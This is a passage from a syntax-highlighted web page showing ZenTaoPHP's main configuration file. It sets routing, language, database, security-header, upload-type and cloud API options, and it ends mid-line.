class="line">262</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ZenTaoPHP的config文件。如果更改配置，不要直接修改该文件，复制到my.php修改相应的值。</span></span><br><span class="line"><span class="comment"> * The config file of zentaophp.  Don&#x27;t modify this file directly, copy the item to my.php and change it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The author disclaims copyright to this source code.  In place of</span></span><br><span class="line"><span class="comment"> * a legal notice, here is a blessing:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  May you do good and not evil.</span></span><br><span class="line"><span class="comment"> *  May you find forgiveness for yourself and forgive others.</span></span><br><span class="line"><span class="comment"> *  May you share freely, never taking more than you give.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保证在命令行环境也能运行。Make sure to run in ztcli env. */</span></span><br><span class="line"><span class="keyword">if</span>(!class_exists(<span class="string">&#x27;config&#x27;</span>))&#123;<span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;&#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(!function_exists(<span class="string">&#x27;getWebRoot&#x27;</span>))&#123;<span class="function"><span class="keyword">function</span> <span class="title">getWebRoot</span>(<span class="params"></span>)</span>&#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 基本设置。Basic settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;version       = <span class="string">&#x27;20.1.1&#x27;</span>;             <span class="comment">// ZenTaoPHP的版本。 The version of ZenTaoPHP. Don&#x27;t change it.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;liteVersion   = <span class="string">&#x27;1.2&#x27;</span>;                <span class="comment">// 迅捷版版本。      The version of Lite.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;charset       = <span class="string">&#x27;UTF-8&#x27;</span>;              <span class="comment">// ZenTaoPHP的编码。 The encoding of ZenTaoPHP.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;cookieLife    = time() + <span class="number">2592000</span>;     <span class="comment">// Cookie的生存时间。The cookie life time.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;timezone      = <span class="string">&#x27;Asia/Shanghai&#x27;</span>;      <span class="comment">// 时区设置。        The time zone setting, for more see http://www.php.net/manual/en/timezones.php.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;webRoot       = <span class="string">&#x27;&#x27;</span>;                   <span class="comment">// URL根目录。       The root path of the url.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;customSession = <span class="literal">false</span>;                <span class="comment">// 是否开启自定义session的存储路径。Whether custom the session save path.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;edition       = <span class="string">&#x27;open&#x27;</span>;               <span class="comment">// 设置系统的edition，可选值：open|biz|max。Set edition, optional: open|biz|max.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;tabSession    = <span class="literal">false</span>;                <span class="comment">// 是否开启浏览器新标签独立session.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;clientCache   = <span class="literal">false</span>;                <span class="comment">// 是否开启客户端缓存。Whether enable client cache or not.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 框架路由相关设置。Routing settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;requestType = <span class="string">&#x27;PATH_INFO&#x27;</span>;               <span class="comment">// 请求类型：PATH_INFO|PATHINFO2|GET。    The request type: PATH_INFO|PATH_INFO2|GET.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;requestFix  = <span class="string">&#x27;-&#x27;</span>;                       <span class="comment">// PATH_INFO和PATH_INFO2模式的分隔符。    The divider in the url when PATH_INFO|PATH_INFO2.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;moduleVar   = <span class="string">&#x27;m&#x27;</span>;                       <span class="comment">// 请求类型为GET：模块变量名。            requestType=GET: the module var name.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;methodVar   = <span class="string">&#x27;f&#x27;</span>;                       <span class="comment">// 请求类型为GET：模块变量名。            requestType=GET: the method var name.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;viewVar     = <span class="string">&#x27;t&#x27;</span>;                       <span class="comment">// 请求类型为GET：视图变量名。            requestType=GET: the view var name.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;sessionVar  = <span class="string">&#x27;zentaosid&#x27;</span>;               <span class="comment">// 请求类型为GET：session变量名。         requestType=GET: the session var name.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;views       = <span class="string">&#x27;,html,json,mhtml,xhtml,&#x27;</span>; <span class="comment">// 支持的视图类型。                       Supported view formats.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;visions     = <span class="string">&#x27;,rnd,lite,or,&#x27;</span>;           <span class="comment">// 支持的界面类型。                       Supported vision formats.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ZIN 设置。 ZIN settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;zin = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 支持的主题和语言。Supported themes and languages. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;themes[<span class="string">&#x27;default&#x27;</span>] = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;langs[<span class="string">&#x27;zh-cn&#x27;</span>]    = <span class="string">&#x27;简体&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;langs[<span class="string">&#x27;zh-tw&#x27;</span>]    = <span class="string">&#x27;繁體&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;langs[<span class="string">&#x27;en&#x27;</span>]       = <span class="string">&#x27;English&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;langs[<span class="string">&#x27;de&#x27;</span>]       = <span class="string">&#x27;Deutsch&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;langs[<span class="string">&#x27;fr&#x27;</span>]       = <span class="string">&#x27;Français&#x27;</span>;</span><br><span class="line"><span class="comment">//$config-&gt;langs[&#x27;vi&#x27;]       = &#x27;Tiếng Việt&#x27;;</span></span><br><span class="line"><span class="comment">//$config-&gt;langs[&#x27;ja&#x27;]       = &#x27;日本語&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设备类型视图文件前缀。The prefix for view file for different device. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;devicePrefix[<span class="string">&#x27;mhtml&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;devicePrefix[<span class="string">&#x27;xhtml&#x27;</span>] = <span class="string">&#x27;x.&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 默认值设置。Default settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;default = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;default-&gt;view   = <span class="string">&#x27;html&#x27;</span>;        <span class="comment">//默认视图。 Default view.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;default-&gt;lang   = <span class="string">&#x27;en&#x27;</span>;          <span class="comment">//默认语言。 Default language.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;default-&gt;theme  = <span class="string">&#x27;default&#x27;</span>;     <span class="comment">//默认主题。 Default theme.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;default-&gt;module = <span class="string">&#x27;index&#x27;</span>;       <span class="comment">//默认模块。 Default module.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;default-&gt;method = <span class="string">&#x27;index&#x27;</span>;       <span class="comment">//默认方法。 Default method.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 数据库设置。Database settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;db = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;slaveDB = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;db-&gt;persistent      = <span class="literal">false</span>;     <span class="comment">// 是否为持续连接。       Pconnect or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;db-&gt;driver          = <span class="string">&#x27;mysql&#x27;</span>;   <span class="comment">// 目前只支持MySQL数据库。Must be MySQL. Don&#x27;t support other database server yet.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;db-&gt;encoding        = <span class="string">&#x27;UTF8&#x27;</span>;    <span class="comment">// 数据库编码。           Encoding of database.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;db-&gt;strictMode      = <span class="literal">true</span>;      <span class="comment">// 默认开启MySQL的严格模式。  Turn on the strict mode of MySQL.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;db-&gt;prefix          = <span class="string">&#x27;zt_&#x27;</span>;     <span class="comment">// 数据库表名前缀。       The prefix of the table name.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;db-&gt;enableSqlite    = <span class="literal">false</span>;     <span class="comment">// 是否启用SQLite         Enable SQLite or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;slaveDBList         = <span class="keyword">array</span>();   <span class="comment">// 支持多个从库。         Support multiple slave dbs.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span>-&gt;metricDB = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;metricDB-&gt;type      = <span class="string">&#x27;mysql&#x27;</span>;   <span class="comment">// 度量计算数据库类型。   The type of metric database.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 可用域名后缀列表。Domain postfix lists. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix  = <span class="string">&quot;|com|com.cn|com.hk|com.tw|com.vc|edu.cn|es|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|eu|fm|gov.cn|gs|hk|im|in|info|jp|kr|la|me|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|mobi|my|name|net|net.cn|org|org.cn|pk|pro|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|sg|so|tel|tk|to|travel|tv|tw|uk|us|ws|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|ac.cn|bj.cn|sh.cn|tj.cn|cq.cn|he.cn|sn.cn|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|sx.cn|nm.cn|ln.cn|jl.cn|hl.cn|js.cn|zj.cn|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|ah.cn|fj.cn|jx.cn|sd.cn|ha.cn|hb.cn|hn.cn|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|gd.cn|gx.cn|hi.cn|sc.cn|gz.cn|yn.cn|gs.cn|pub|pw|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|qh.cn|nx.cn|xj.cn|tw.cn|hk.cn|mo.cn|xz.cn|xyz|wang|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|ae|asia|biz|cc|cd|cm|cn|co|co.jp|co.kr|co.uk|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|top|ren|club|space|tm|website|cool|company|city|email|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|market|software|ninja|bike|today|life|co.il|io|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|mn|ph|ps|tl|uz|vn|co.nz|cz|gg|gl|gr|je|md|me.uk|org.uk|pl|si|sx|vg|ag|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|bz|cl|ec|gd|gy|ht|lc|ms|mx|pe|tc|vc|ac|bi|mg|mu|sc|as|com.sb|cx|ki|nf|sh|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|rocks|social|co.com|bio|reviews|link|sexy|us.com|consulting|moda|desi|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|menu|info|events|webcam|dating|vacations|flights|cruises|global|ca|guru|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|futbol|rentals|dance|lawyer|attorney|democrat|republican|actor|condos|immobilien|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|villas|foundation|expert|works|tools|watch|zone|bargains|agency|best|solar|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|farm|pics|photo|marketing|holiday|gift|buzz|guitars|trade|construction|&quot;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;domainPostfix .= <span class="string">&quot;|international|house|coffee|florist|rich|ceo|camp|education|repair|win|site|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Config for Content-Security-Policy. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;CSPs = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;CSPs[] = <span class="string">&quot;form-action &#x27;self&#x27;;connect-src &#x27;self&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Config for kanban col setting */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;colWidth    = <span class="number">264</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;minColWidth = <span class="number">264</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;maxColWidth = <span class="number">384</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 系统框架配置。Framework settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;autoConnectDB   = <span class="literal">true</span>;  <span class="comment">// 是否自动连接数据库。              Whether auto connect database or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;multiLanguage   = <span class="literal">true</span>; <span class="comment">// 是否启用多语言功能。              Whether enable multi language or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;multiTheme      = <span class="literal">true</span>; <span class="comment">// 是否启用多风格功能。              Whether enable multi theme or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;multiSite       = <span class="literal">false</span>; <span class="comment">// 是否启用多站点模式。              Whether enable multi site mode or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;extensionLevel  = <span class="number">1</span>;     <span class="comment">// 0=&gt;无扩展,1=&gt;公共扩展,2=&gt;站点扩展 0=&gt;no extension, 1=&gt; common extension, 2=&gt; every site has it&#x27;s extension.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;jsWithPrefix    = <span class="literal">false</span>;  <span class="comment">// js::set()输出的时候是否增加前缀。 When us js::set(), add prefix or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;filterBadKeys   = <span class="literal">true</span>;  <span class="comment">// 是否过滤不合要求的键值。          Whether filter bad keys or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;filterTrojan    = <span class="literal">true</span>;  <span class="comment">// 是否过滤木马攻击代码。            Whether strip trojan code or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;filterXSS       = <span class="literal">true</span>;  <span class="comment">// 是否过滤XSS攻击代码。             Whether strip xss code or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;filterParam     = <span class="number">2</span>;     <span class="comment">// 1=&gt;默认过滤，2=&gt;开启过滤参数功能。0=&gt;default filter 2=&gt;Whether strip param.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;purifier        = <span class="literal">true</span>;  <span class="comment">// 是否对数据做purifier处理。        Whether purifier data or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;logDays         = <span class="number">14</span>;    <span class="comment">// 日志文件保存的天数。              The days to save log files.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;autoRepairTable = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;autoLang        = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;filterCSRF      = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;setCookieSecure = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;sendXCTO        = <span class="literal">true</span>;   <span class="comment">// Send X-Content-Type-Options header.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;sendXXP         = <span class="literal">true</span>;   <span class="comment">// Send X-XSS-Protection header.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;sendHSTS        = <span class="literal">true</span>;   <span class="comment">// Send HTTP Strict Transport Security header.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;sendRP          = <span class="literal">true</span>;   <span class="comment">// Send Referrer-Policy header.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;sendXPCDP       = <span class="literal">true</span>;   <span class="comment">// Send X-Permitted-Cross-Domain-Policies header.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;sendXDO         = <span class="literal">true</span>;   <span class="comment">// Send X-Download-Options header.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;detectDevice[<span class="string">&#x27;zh-cn&#x27;</span>] = <span class="literal">true</span>; <span class="comment">// 在zh-cn语言情况下，是否启用设备检测功能。 Whether enable device detect or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;detectDevice[<span class="string">&#x27;zh-tw&#x27;</span>] = <span class="literal">true</span>; <span class="comment">// 在zh-tw语言情况下，是否启用设备检测功能。 Whether enable device detect or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;detectDevice[<span class="string">&#x27;en&#x27;</span>]    = <span class="literal">true</span>; <span class="comment">// 在en语言情况下，是否启用设备检测功能。    Whether enable device detect or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;detectDevice[<span class="string">&#x27;de&#x27;</span>]    = <span class="literal">true</span>; <span class="comment">// 在de语言情况下，是否启用设备检测功能。    Whether enable device detect or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;detectDevice[<span class="string">&#x27;fr&#x27;</span>]    = <span class="literal">true</span>; <span class="comment">// 在fr语言情况下，是否启用设备检测功能。    Whether enable device detect or not.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;framework-&gt;detectDevice[<span class="string">&#x27;vi&#x27;</span>]    = <span class="literal">true</span>; <span class="comment">// 在vi语言情况下，是否启用设备检测功能。    Whether enable device detect or not.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP white list settings.*/</span></span><br><span class="line"><span class="variable">$config</span>-&gt;ipWhiteList   = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;xFrameOptions = <span class="string">&#x27;SAMEORIGIN&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Switch for zentao features. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;features = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;features-&gt;apiGetModel    = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;features-&gt;apiSQL         = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;features-&gt;cronSystemCall = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;features-&gt;checkClient    = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文件上传设置。 Upload settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;file = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;file-&gt;dangers     = <span class="string">&#x27;php,php3,php4,phtml,php5,jsp,py,rb,asp,aspx,ashx,asa,cer,cdx,aspl,shtm,shtml,html,htm&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;file-&gt;allowed     = <span class="string">&#x27;txt,doc,docx,dot,wps,wri,pdf,ppt,pptx,xls,xlsx,ett,xlt,xlsm,csv,jpg,jpeg,png,psd,gif,ico,bmp,swf,avi,rmvb,rm,mp3,mp4,3gp,flv,mov,movie,rar,zip,bz,bz2,tar,gz,mpp,rp,pdm,vsdx,vsd,sql&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;file-&gt;storageType = <span class="string">&#x27;fs&#x27;</span>;         <span class="comment">// fs or s3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Upload settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;allowedTags = <span class="string">&#x27;&lt;p&gt;&lt;span&gt;&lt;h1&gt;&lt;h2&gt;&lt;h3&gt;&lt;h4&gt;&lt;h5&gt;&lt;em&gt;&lt;u&gt;&lt;strong&gt;&lt;br&gt;&lt;ol&gt;&lt;ul&gt;&lt;li&gt;&lt;img&gt;&lt;a&gt;&lt;b&gt;&lt;font&gt;&lt;hr&gt;&lt;pre&gt;&lt;div&gt;&lt;table&gt;&lt;td&gt;&lt;th&gt;&lt;tr&gt;&lt;tbody&gt;&lt;embed&gt;&lt;style&gt;&lt;s&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;accountRule = <span class="string">&#x27;|^[a-zA-Z0-9_]&#123;1&#125;[a-zA-Z0-9_\.]&#123;1,&#125;[a-zA-Z0-9_]&#123;1&#125;$|&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;checkVersion = <span class="literal">true</span>;              <span class="comment">// Auto check for new version or not.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the wide window size and timeout(ms) and duplicate interval time(s). */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;wideSize      = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;timeout       = <span class="number">30000</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;duplicateTime = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;maxCount      = <span class="number">500</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;moreLinks     = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 渠成平台设置。CNE Api settings. */</span></span><br><span class="line"><span class="variable">$config</span>-&gt;inQuickon    = strtolower((<span class="keyword">string</span>)getenv(<span class="string">&#x27;IN_QUICKON&#x27;</span>)) == <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;inContainer  = strtolower((<span class="keyword">string</span>)getenv(<span class="string">&#x27;IS_CONTAINER&#x27;</span>)) == <span class="string">&#x27;true&#x27;</span> || strtolower((<span class="keyword">string</span>)getenv(<span class="string">&#x27;IN_CONTAINER&#x27;</span>)) == <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;k8space      = <span class="string">&#x27;quickon-system&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;demoAccounts = <span class="string">&#x27;&#x27;</span>;  <span class="comment">// 用于演示的账号列表，该账号安装的应用30钟后会自动删除。 In account list for demo, app instance of demo will be removed in 30 minutes.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;demoAppLife  = <span class="number">30</span>; <span class="comment">// Demo安装的应用实例存续时长(分钟)。The minutes life of instance which demo account installed.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;CNE = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;api = <span class="keyword">new</span> <span class="built_in">stdclass</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;api-&gt;host    = getenv(<span class="string">&#x27;CNE_API_HOST&#x27;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;api-&gt;auth    = <span class="string">&#x27;X-Auth-Token&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;api-&gt;token   = getenv(<span class="string">&#x27;CNE_API_TOKEN&#x27;</span>); <span class="comment">// Please set token in my.php.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;api-&gt;headers = <span class="keyword">array</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;api-&gt;channel = <span class="string">&#x27;stable&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;app = <span class="keyword">new</span> <span class="built_in">stdclass</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;CNE-&gt;app-&gt;domain = <span class="string">&#x27;dev.haogs.cn&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span>-&gt;cloud = <span class="keyword">new</span> <span class="built_in">stdclass</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;cloud-&gt;api = <span class="keyword">new</span> <span class="built_in">stdclass</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;cloud-&gt;api-&gt;host          = getenv(<span class="string">&#x27;CLOUD_API_HOST&#x27;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;cloud-&gt;api-&gt;auth          = <span class="string">&#x27;X-Auth-Token&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;cloud-&gt;api-&gt;token         = getenv(<span class="string">&#x27;CLOUD_API_TOKEN&#x27;</span>); <span class="comment">// Please set token in my.php.</span></span><br><span class="line"><span class="variable">$config</span>-&gt;cloud-&gt;api-&gt;headers       = <span class="keyword">array</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;cloud-&gt;api-&gt;channel       = getenv(<span class="string">&#x27;CLOUD_DEFAULT_CHANNEL&#x27;</span>) ? getenv(<span class="string">&#x27;CLOUD_DEFAULT_CHANNEL&#x27;</span>) : <span class="string">&#x27;stable&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>-&gt;cloud-&gt;api-&gt;switchChannel = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 配置参数过滤。Filter param settings. */</span></span><br><span class="line"><span class="variable">$filterConfig</span> = dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR . <span class="string">&#x27;filter.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$filterConfig</span>)) <span class="keyword">include</span> <span class="variable">$filterConfig</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 引用数据库的配置。 Include the database config file. */</span></span><br><span class="line"><span class="variable">$dbConfig</span> = dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR . <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$dbConfig</span>)) <span class="keyword">include</span> <span class="variable">$dbConfig</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 引用缓存的配置。 Include the cache config file. */</span></span><br><span class="line"><span class="variable">$cacheConfig</span> = dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR . <span class="string">&#x27;cache.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$cacheConfig</span>)) <span class="keyword">include</span> <span class="variable">$cacheConfig</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读取环境变量的配置。 Read the env config. */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span>-&gt;inContainer || <span class="variable">$config</span>-&gt;inQuickon)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$webRoot</span> = getenv(<span class="string">&#x27;ZT_WEB_ROOT&#x27;</span>) ? trim(getenv(<span class="string">&#x27;ZT_WEB_ROOT&#x27;</span>), <span class="string">&#x27;/&#x27;</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>-&gt;installed     = strtolower((<span class="keyword">string</span>)getenv(<span class="string">&#x27;ZT_INSTALLED&#x27;</span>)) == <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>-&gt;debug         = (<span class="keyword">int</span>)getenv(<span class="string">&#x27;ZT_DEBUG&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;requestType   = getenv(<span class="string">&#x27;ZT_REQUEST_TYPE&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;timezone      = getenv(<span class="string">&#x27;ZT_TIMEZONE&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;driver    = getenv(<span class="string">&#x27;ZT_DB_DRIVER&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;host      = getenv(<span class="string">&#x27;ZT_DB_HOST&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;port      = getenv(<span 